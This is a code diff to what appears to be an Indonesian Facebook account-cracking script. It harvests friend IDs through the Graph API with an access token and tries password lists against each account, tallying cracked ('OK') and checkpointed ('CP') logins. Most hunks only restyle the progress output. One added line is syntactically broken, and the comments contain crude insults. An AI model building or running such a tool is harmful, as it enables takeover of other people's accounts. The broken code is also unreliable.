@@ -233,7 +233,7 @@ class menu:
 				try:
 					print(' %s║'%(N))
 					idt = input(' %s╠═[%s•%s] Masukan id yang ke %s : '%(N,O,N,ikeh))
-					r = requests.get(f'https://graph.facebook.com/{idt}?fields=name,friends.fields(id,name)&access_token={token}')
+					r = requests.get(f'https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%={token}')
 					z = json.loads(r.text)
 					id = []
 					for a in z['friends']['data']:
@@ -705,7 +705,7 @@ class crack:
 		global loop,ok,cp
 		eram = random.choice([M,K,H,U,P,N])
 		nufi = random.choice([N,P,U,H,K,M])
-		sys.stdout.write('\r [%scrack%s] %s/%s [OK:%s - CP:%s]'%(eram,N,O,N,loop,len(self.id),len(ok),len(cp),nufi));sys.stdout.flush() # Lo kontol...
+		sys.stdout.write('\r %s* %s[%scrack%s] %s/%s [OK:%s - CP:%s] %s*'%(eram,N,O,N,loop,len(self.id),len(ok),len(cp),nufi));sys.stdout.flush() # Lo kontol...
 		try:
 			for pw in pwx:
 				pw = pw.lower()
@@ -767,7 +767,7 @@ class crack:
 		ram = random.choice([M,P,H,U,J,N,B])
 		fikA = loop*100/len(self.id)
 		nufikhaXD = '%'
-		print('\r [crack] %s/%s [OK:%s-CP:%s]'%(ram,loop,len(self.id),len(ok),len(cp),int(fikA),str(nufikhaXD),N), end=' ');sys.stdout.flush()
+		print('\r%s [crack] %s/%s [OK:%s-CP:%s] >< %s%s%s '%(ram,loop,len(self.id),len(ok),len(cp),int(fikA),str(nufikhaXD),N), end=' ');sys.stdout.flush()
 		ua = random.choice(ugen)
 		ua2 = random.choice(ugen2)
 		ses = requests.Session()
@@ -803,7 +803,7 @@ class crack:
 		global loop,ok,cp
 		asw = random.choice([M,K,H,U])
 		mmk = random.choice([K,M,U,H])
-		sys.stdout.write('\r [%scrack%s] %s/%s [OK:%s CP:%s] '%(asw,N,H,N,loop,len(self.id),len(ok),len(cp),mmk));sys.stdout.flush()
+		sys.stdout.write('\r %s* %s[%scrack%s] %s/%s [OK:%s CP:%s] %s* '%(asw,N,H,N,loop,len(self.id),len(ok),len(cp),mmk));sys.stdout.flush()
 		try:
 			for pw in pwx:
 				pw = pw.lower()
